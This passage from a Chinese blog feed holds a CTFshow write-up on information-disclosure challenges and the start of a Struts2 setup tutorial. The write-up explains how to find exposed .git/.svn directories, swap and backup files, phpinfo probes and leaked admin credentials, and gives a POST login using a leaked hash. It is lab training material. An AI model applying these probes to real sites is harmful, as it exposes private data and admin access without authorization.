    <id>http://atkx.top/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
    <published>2021-03-26T14:28:01.000Z</published>
    <updated>2021-08-15T03:59:06.441Z</updated>
    
    <content type="html"><![CDATA[<p>CTFshow靶场 Web入门系列</p> <a id="more"></a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><h3 id="考点-源码泄露"><a href="#考点-源码泄露" class="headerlink" title="考点: 源码泄露"></a>考点: 源码泄露</h3><blockquote><p>题目描述：开发注释未及时删除</p></blockquote><p>查看源代码，得到flag</p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><h3 id="考点-前台JS绕过"><a href="#考点-前台JS绕过" class="headerlink" title="考点: 前台JS绕过"></a>考点: 前台JS绕过</h3><blockquote><p>题目描述:js前台拦截 === 无效操作</p></blockquote><p>查看源码方法很多<br>1.禁用JS,再查看源代码；<br>2.在网址前加上<code>view-source:</code>即可查看源代码<br>3.ctrl+u查看源代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-built_in">window</span>.oncontextmenu = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;  <br><span class="hljs-comment">//禁用鼠标右键</span><br><span class="hljs-built_in">window</span>.onselectstart = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;<br><span class="hljs-comment">//禁用页面选择</span><br><span class="hljs-built_in">window</span>.onkeydown = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> (event.keyCode==<span class="hljs-number">123</span>)&#123;event.keyCode=<span class="hljs-number">0</span>;event.returnValue=<span class="hljs-literal">false</span>;&#125;&#125;;<br>&lt;/script&gt;<br>   <span class="hljs-comment">//禁用F12键</span><br></code></pre></td></tr></table></figure><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><h3 id="考点-协议头信息泄露"><a href="#考点-协议头信息泄露" class="headerlink" title="考点: 协议头信息泄露"></a>考点: 协议头信息泄露</h3><blockquote><p>题目描述：没思路的时候抓个包看看，可能会有意外收获</p></blockquote><p>抓包，查看响应头，即可得到flag</p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><h3 id="考点-robots后台泄露"><a href="#考点-robots后台泄露" class="headerlink" title="考点: robots后台泄露"></a>考点: robots后台泄露</h3><blockquote><p>题目描述：总有人把后台地址写入robots，帮黑阔大佬们引路。</p></blockquote><p>访问robots.txt，得到flagishere.txt信息，访问即可</p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><h3 id="考点-phps源码泄露"><a href="#考点-phps源码泄露" class="headerlink" title="考点: phps源码泄露"></a>考点: phps源码泄露</h3><blockquote><p>题目描述：phps源码泄露有时候能帮上忙</p></blockquote><p>访问index.phps下载备份文件</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><h3 id="考点-源码压缩包泄露"><a href="#考点-源码压缩包泄露" class="headerlink" title="考点: 源码压缩包泄露"></a>考点: 源码压缩包泄露</h3><blockquote><p>题目描述：解压源码到当前目录，测试正常，收工</p></blockquote><p>访问<a href="http://www.zip下载源码,解压得到fl000g.txt,里面的是假flag,需要访问才会得到真flag/">www.zip下载源码，解压得到fl000g.txt，里面的是假flag，需要访问才会得到真flag</a></p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><h3 id="考点-Git泄露"><a href="#考点-Git泄露" class="headerlink" title="考点: Git泄露"></a>考点: Git泄露</h3><blockquote><p>题目描述：版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>访问目录url/.git/</p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><h3 id="考点-SVN泄露"><a href="#考点-SVN泄露" class="headerlink" title="考点: SVN泄露"></a>考点: SVN泄露</h3><blockquote><p>题目描述：版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>访问url/.svn即可</p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><h3 id="考点-vim临时文件泄露"><a href="#考点-vim临时文件泄露" class="headerlink" title="考点: vim临时文件泄露"></a>考点: vim临时文件泄露</h3><blockquote><p>题目描述：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>提示在使用vim时意外退出，会在目录下生成一个备份文件，格式为 .文件名.swp，访问url/index.php.swp下载备份文件</p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><h3 id="考点-cookie泄露"><a href="#考点-cookie泄露" class="headerlink" title="考点: cookie泄露"></a>考点: cookie泄露</h3><blockquote><p>题目描述：cookie 只是一块饼干，不能存放任何隐私数据</p></blockquote><p>抓包查看cookie发现flag</p><h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><h3 id="考点-域名txt记录泄露"><a href="#考点-域名txt记录泄露" class="headerlink" title="考点: 域名txt记录泄露"></a>考点: 域名txt记录泄露</h3><blockquote><p>题目描述：域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</p></blockquote><p>在线DNS域名解析，即可得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://whois.chinaz.com/<br>http://www.jsons.cn/nslookup/<br>https://zijian.aliyun.com/<br></code></pre></td></tr></table></figure><h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><h3 id="考点-敏感信息公布"><a href="#考点-敏感信息公布" class="headerlink" title="考点: 敏感信息公布"></a>考点: 敏感信息公布</h3><blockquote><p>题目描述：有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问后台地址admin，管理员账号admin，在网页底找到了电话号码，猜测是密码</p><h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><h3 id="考点-内部技术文档泄露"><a href="#考点-内部技术文档泄露" class="headerlink" title="考点: 内部技术文档泄露"></a>考点: 内部技术文档泄露</h3><blockquote><p>题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p></blockquote><p>在网页底部找到一个doucument链接。得到后台地址<code>/system1103/login.php</code>和帐号密码</p><h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><h3 id="考点-编辑器配置不当"><a href="#考点-编辑器配置不当" class="headerlink" title="考点: 编辑器配置不当"></a>考点: 编辑器配置不当</h3><blockquote><p>题目描述：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>访问url/editor，发现一个网页自带的编辑器,点击上传图片，可以看到文件目录，/var/www/html/nothinghere 中有一个fl000g.txt，访问<code>/nothinghere/fl000g.txt</code>即可得到flag</p><h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><h3 id="考点-密码逻辑脆弱"><a href="#考点-密码逻辑脆弱" class="headerlink" title="考点: 密码逻辑脆弱"></a>考点: 密码逻辑脆弱</h3><blockquote><p>题目描述：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>在底部找到邮箱信息，访问后台地址/admin，用户名admin ，选择忘记密码。查找到邮箱qq所在地为西安，返回修改后的密码，登录即可得到flag。</p><h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><h3 id="考点-探针泄露"><a href="#考点-探针泄露" class="headerlink" title="考点: 探针泄露"></a>考点: 探针泄露</h3><blockquote><p>题目描述：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>访问/tz.php，看下PHP参数,点击phpinfo超链接，在phpinfo页面搜索ctfshow即可</p><h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><h3 id="考点-CDN穿透"><a href="#考点-CDN穿透" class="headerlink" title="考点: CDN穿透"></a>考点: CDN穿透</h3><blockquote><p>题目描述：透过重重缓存，查找到ctfer.com的真实IP，提交 flag{IP地址}</p></blockquote><p>根据hint提示，直接ping <a href="http://www.ctfshow.com得到ip地址111.231.70.44/">www.ctfshow.com得到IP地址111.231.70.44</a></p><h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><h3 id="考点-js敏感信息泄露"><a href="#考点-js敏感信息泄露" class="headerlink" title="考点: js敏感信息泄露"></a>考点: js敏感信息泄露</h3><blockquote><p>题目描述：不要着急，休息，休息一会儿，玩101分给你flag</p></blockquote><p>查看源码，发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/Flappy_js.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>访问/js/Flappy_js.js查看Flappy_js.js文件，发现了一段编码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(score&gt;<span class="hljs-number">100</span>)<br>&#123;<br><span class="hljs-keyword">var</span> result=<span class="hljs-built_in">window</span>.confirm(<span class="hljs-string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Unicode解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">你赢了，去幺幺零点皮爱吃皮看看<br></code></pre></td></tr></table></figure><p>访问/110.php即可</p><h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><h3 id="考点-前端密钥泄露"><a href="#考点-前端密钥泄露" class="headerlink" title="考点: 前端密钥泄露"></a>考点: 前端密钥泄露</h3><blockquote><p>题目描述：密钥什么的，就不要放在前端了</p></blockquote><p>查看源码，前端含有注释代码，泄露了用户名和密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    error_reporting(0);</span><br><span class="hljs-comment">    $flag=&quot;fakeflag&quot;</span><br><span class="hljs-comment">    $u = $_POST[&#x27;username&#x27;];</span><br><span class="hljs-comment">    $p = $_POST[&#x27;pazzword&#x27;];</span><br><span class="hljs-comment">    if(isset($u) &amp;&amp; isset($p))&#123;</span><br><span class="hljs-comment">        if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123;</span><br><span class="hljs-comment">            echo $flag;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">    --&gt;</span><br></code></pre></td></tr></table></figure><p>输入用户名和密码提示不正确，用Post提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04<br></code></pre></td></tr></table></figure><h2 id="WEB-20"><a href="#WEB-20" class="headerlink" title="WEB 20"></a>WEB 20</h2><h3 id="考点-数据库恶意下载"><a href="#考点-数据库恶意下载" class="headerlink" title="考点: 数据库恶意下载"></a>考点: 数据库恶意下载</h3><blockquote><p>题目描述：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>早期asp+access架构的数据库文件为db.mdb，直接查看url路径添加加/db/db.mdb下载文件，用记事本打开搜索flag即可。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTFshow靶场 Web入门系列&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="信息泄露" scheme="http://atkx.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
    <category term="CTFshow" scheme="http://atkx.top/tags/CTFshow/"/>
    
  </entry>
  
  <entry>
    <title>Struts2框架入门</title>
    <link href="http://atkx.top/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/"/>
    <id>http://atkx.top/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/</id>
    <published>2021-03-19T12:26:02.000Z</published>
    <updated>2021-08-15T03:59:06.498Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（一）</p> <a id="more"></a><h1 id="Struts2框架入门"><a href="#Struts2框架入门" class="headerlink" title="Struts2框架入门"></a>Struts2框架入门</h1><h2 id="Struts2简介"><a href="#Struts2简介" class="headerlink" title="Struts2简介"></a>Struts2简介</h2><blockquote><p>Struts2是一种基于MVC模式的轻量级Web框架，Struts2是Struts1的下一代产品，是在Struts1和WebWork技术的基础上进行合并后的全新框架</p></blockquote><p>struts2框架其实是对javaWeb表现层的MVC作了优化</p><h2 id="Struts2的优点"><a href="#Struts2的优点" class="headerlink" title="Struts2的优点"></a>Struts2的优点</h2><p>1、项目开源，使用及拓展方便，天生优势。<br>2、提供Exception处理机制。<br>3、Result方式的页面导航，通过Result标签实现页面跳转。4<br>4、通过简单、集中的配置来调度业务类，方便修改。<br>5、提供简单、统一的表达式语言来访问所有可供访问的数据。<br>6、提供标准、强大的验证框架和国际化框架。<br>7、提供强大的、可以有效减少页面代码的标签。<br>8、提供良好的Ajax支持。<br>9、拥有简单的插件，可以扩展Struts2框架。<br>10、拥有智能的默认设置，不需要另外进行繁琐的设置。</p><h2 id="Struts2入门案例"><a href="#Struts2入门案例" class="headerlink" title="Struts2入门案例"></a>Struts2入门案例</h2><h3 id="第一步：下载jar包"><a href="#第一步：下载jar包" class="headerlink" title="第一步：下载jar包"></a>第一步：下载jar包</h3><p>下载地址：<a href="https://struts.apache.org/">https://struts.apache.org/</a></p><p>选择struts-2.3.37-all.zip 下载<br><img src="https://img-blog.csdnimg.cn/20210318221037734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>下载解压后，出现以下界面,struts-2.3.37的目录结构：<br><img src="https://img-blog.csdnimg.cn/20210318221245199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>由于struts的jar包并不全部需要，找到apps目录下struts2-blank.war</p><p><img src="https://img-blog.csdnimg.cn/20210318221723429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压struts2-blank.war，将示例程序lib目录下的jar包添加到我们项目中即可，此版本的Struts2项目必需的13个jar包。<br><img src="https://img-blog.csdnimg.cn/20210318221628262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第二步：创建项目导入jar包"><a href="#第二步：创建项目导入jar包" class="headerlink" title="第二步：创建项目导入jar包"></a>第二步：创建项目导入jar包</h3><p>创建项目，将上面的13个jar包粘贴到lib中，然后build path，会在Web App Libraries中看到<br><img src="https://img-blog.csdnimg.cn/20210319193907712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第三步：配置web-xml"><a href="#第三步：配置web-xml" class="headerlink" title="第三步：配置web.xml"></a>第三步：配置web.xml</h3><p>编辑web应用的web.xml配置文件，配置struts2的核心拦截器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> </span><br><span class="hljs-tag"> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee </span></span><br><span class="hljs-tag"><span class="hljs-string"> http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> </span><br><span class="hljs-tag"> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>FirstStruts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--配置Struts2核心过滤器--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="第四步：创建Action类"><a href="#第四步：创建Action类" class="headerlink" title="第四步：创建Action类"></a>第四步：创建Action类</h3><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="第五步：创建struts-xml文件"><a href="#第五步：创建struts-xml文件" class="headerlink" title="第五步：创建struts.xml文件"></a>第五步：创建struts.xml文件</h3><p>引入dtd约束，该代码可以在WebContent\WEB-INF\lib\struts2-core-2.3.37.jar找到<br><img src="https://img-blog.csdnimg.cn/20210319195632426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>配置action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>       <span class="hljs-comment">&lt;!-- 配置Action --&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.HelloWorldAction&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- 配置result结果页面跳转 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>      <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-comment">&lt;!-- 指定Struts2配置文件的D2T信息 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Struts2的Action必须放在指定的包空间下定义 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>       <br>       <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.HelloWorldAction&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>      <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>解决Struts2的配置文件struts.xml文件无提示问题</strong><br>struts.xml文件提示来自DTD约束：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta">    <span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta">    <span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>方法1：电脑可以上网，会自动访问<code>http://struts.apache.org/dtds/struts-2.3.dtd</code>，提供提示功能<br>方法2: 配置本地DTD提示<br>首先需要找到我们的struts核心jar包<code>struts2-core-2.3.30.jar</code>，然后我们需要将它解压，可以看到<code>struts-2.3.dtd</code>文件<br><img src="https://img-blog.csdnimg.cn/2021032319251158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择window  –&gt; preferences  –&gt;  搜索xml  –&gt;  选择xml Catalog<br><img src="https://img-blog.csdnimg.cn/20210323192626738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>  Location：点击File System，添加刚才解压ruts2-2.3.dtd文件路径。</li><li>   Key type ：选择URI</li><li>  key：<a href="http://struts.apache.org/dtds/struts-2.3.dtd">http://struts.apache.org/dtds/struts-2.3.dtd</a><br><img 